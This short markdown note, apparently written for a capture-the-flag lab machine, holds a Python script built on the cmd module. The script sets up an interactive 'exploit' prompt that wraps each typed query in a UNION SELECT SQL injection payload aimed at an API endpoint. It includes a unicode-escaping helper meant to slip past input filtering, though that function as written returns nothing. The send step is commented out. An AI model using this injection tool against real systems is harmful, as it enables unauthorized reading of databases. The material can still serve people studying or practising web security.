# Python cmd prompt

Ref : [https://pymotw.com/2/cmd/](https://pymotw.com/2/cmd/)

```text
import requests
import json
import cmd

url = "http://10.10.10.179/api/getColleagues"
header = {"Content-Type":"application/json;charset=utf-8"}

def  gen_payload(query):
    payload = ""
    for char in query:
        payload = payload + r"\u{:04x}".format(ord(char))

class exploit(cmd.Cmd):
    prompt = "PleaseSub > "

    def default(self, line):
        payload = "a' union select 1,2,3," + line + ",5-- -"
       # payload = gen_payload(payload)
       # data = '{"name":"' + payload  + '"}'
       # r = requests.post(url, data=data, headers=header)
       # print(r.text)
        print(payload)
        
exploit().cmdloop()
```

